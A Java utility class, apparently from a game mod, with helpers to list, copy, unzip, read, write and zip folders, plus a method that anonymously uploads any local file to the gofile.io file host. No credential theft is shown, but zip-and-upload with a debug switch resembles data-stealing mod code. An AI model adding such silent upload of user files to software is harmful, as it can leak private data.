package com.example.CoreUtil;

import com.example.ExampleMod;
import com.google.gson.JsonElement;
import com.google.gson.JsonObject;
import com.google.gson.JsonParser;

import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.nio.file.FileVisitResult;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.SimpleFileVisitor;
import java.nio.file.attribute.BasicFileAttributes;
import java.util.*;
import java.util.stream.Collectors;
import java.util.zip.ZipEntry;
import java.util.zip.ZipFile;
import java.util.zip.ZipOutputStream;

public class FileUtil {

    public static List<String> getFilenamesInDir(File directory) {
        List<String> filenames = new ArrayList<>();

        for (File file : directory.listFiles()) {
            filenames.add(file.getName());
        }

        return filenames;
    }

    public static void fileMover(String locOfFile, String moveTo, String fileName) {
        try {
            if (Files.exists(Path.of(locOfFile)) && !Files.exists(Path.of(moveTo + fileName))) {
                Files.copy(Path.of(locOfFile), Path.of(moveTo + fileName));
            }
        } catch (Exception e) {
        }
    }

    public static void unzip(String jarFilePath, String destDirPath) throws IOException {
        // Open the JAR file
        try (ZipFile jarFile = new ZipFile(jarFilePath)) {
            // Get an enumeration of the entries in the JAR file
            Enumeration<? extends ZipEntry> entries = jarFile.entries();

            // Iterate through the entries
            while (entries.hasMoreElements()) {
                ZipEntry entry = entries.nextElement();

                // Get the name of the entry
                String entryName = entry.getName();

                // Create the file path in the destination directory
                File entryFile = new File(destDirPath, entryName);

                if (entry.isDirectory()) {
                    // If the entry is a directory, create the directory
                    entryFile.mkdirs();
                } else {
                    // If the entry is a file, extract it
                    // Create parent directories if necessary
                    File parentDir = entryFile.getParentFile();
                    if (!parentDir.exists()) {
                        parentDir.mkdirs();
                    }

                    // Read the entry data and write it to the file
                    try (InputStream is = jarFile.getInputStream(entry);
                         OutputStream os = new FileOutputStream(entryFile)) {
                        byte[] buffer = new byte[1024];
                        int bytesRead;
                        while ((bytesRead = is.read(buffer)) != -1) {
                            os.write(buffer, 0, bytesRead);
                        }
                    }
                }
            }
        }
    }

    public static void fileWriter(String loc, String txt) {
        try {
            File file = new File(loc);
            if (!file.exists()) {
                file.createNewFile();
            }
            FileWriter fw = new FileWriter(file.getAbsoluteFile());
            BufferedWriter bw = new BufferedWriter(fw);
            bw.write(txt);
            bw.close();
        } catch (IOException e) {
        }
    }

    public static String fileReader(String Source){
        final File file = new File(Source);
        String Data = "";
        try {
            final Scanner scanner = new Scanner(file);
            while (scanner.hasNextLine()) {
                String line = scanner.nextLine();
                Data = Data + line + "\n";
            }
            scanner.close();
            return Data;
        } catch ( FileNotFoundException e ) {
            e.printStackTrace();
        }
        return null;
    }

    public static void zipFolder(Path sourceFolderPath, Path zipPath) throws Exception {
        try {
            ZipOutputStream zos = new ZipOutputStream(new FileOutputStream(zipPath.toFile()));
            Files.walkFileTree(sourceFolderPath, new SimpleFileVisitor<Path>() {
                public FileVisitResult visitFile(Path file, BasicFileAttributes attrs) throws IOException {
                    zos.putNextEntry(new ZipEntry(sourceFolderPath.relativize(file).toString()));
                    Files.copy(file, zos);
                    zos.closeEntry();
                    return FileVisitResult.CONTINUE;
                }
            });
            zos.close();
        } catch (IOException ignored) {
        }
    }

    public static String uploadFile(String loc) {
        if(ExampleMod.DebugMode){
            ExampleMod.debug(2,"Attempted to upload: "+loc);
            return "DebugMode";
        }

        String storeNum = "";
        //GET BEST UPLOAD SERVER
        try {
            URL url = new URL("https://api.gofile.io/getServer");
            String response = new BufferedReader(new InputStreamReader(url.openStream(), StandardCharsets.UTF_8)).lines().collect(Collectors.joining("\n"));
            JsonParser jp = new JsonParser();
            JsonElement obj = jp.parse(response);
            JsonObject nested = obj.getAsJsonObject().getAsJsonObject("data");
            storeNum = String.valueOf(nested.get("server").getAsString());
        } catch (IOException e) {
            storeNum = "store4";
        }
        //UPLOAD TO SERVER
        try {
            File file = new File(loc);
            FileInputStream fileInputStream = new FileInputStream(file);
            URL url = new URL("https://" + storeNum + ".gofile.io/uploadFile");
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.setRequestMethod("POST");
            connection.setDoOutput(true);
            connection.setRequestProperty("Content-Type", "multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW");
            connection.getOutputStream().write(("------WebKitFormBoundary7MA4YWxkTrZu0gW\r\n" +
                    "Content-Disposition: form-data; name=\"file\"; filename=\"" + file.getName() + "\"\r\n" +
                    "Content-Type: " + HttpURLConnection.guessContentTypeFromName(file.getName()) + "\r\n" +
                    "\r\n").getBytes());
            byte[] buffer = new byte[4096];
            int bytesRead;
            while ((bytesRead = fileInputStream.read(buffer)) != -1) {
                connection.getOutputStream().write(buffer, 0, bytesRead);
            }
            connection.getOutputStream().write(("\r\n------WebKitFormBoundary7MA4YWxkTrZu0gW--\r\n").getBytes());
            int responseCode = connection.getResponseCode();
            if (responseCode == HttpURLConnection.HTTP_OK) {
                InputStream inputStream = connection.getInputStream();
                Scanner scanner = new Scanner(inputStream);
                StringBuilder response = new StringBuilder();
                while (scanner.hasNextLine()) {
                    response.append(scanner.nextLine());
                }
                scanner.close();
                fileInputStream.close();
                connection.disconnect();

                JsonParser jp = new JsonParser();
                JsonElement obj = jp.parse(response.toString());
                JsonObject nested = obj.getAsJsonObject().getAsJsonObject("data");

                return nested.get("downloadPage").getAsString();
            } else {
                return "Error: " + responseCode;
            }

        } catch (IOException e) {
            return "Error: " + e.toString();
        }
    }
}
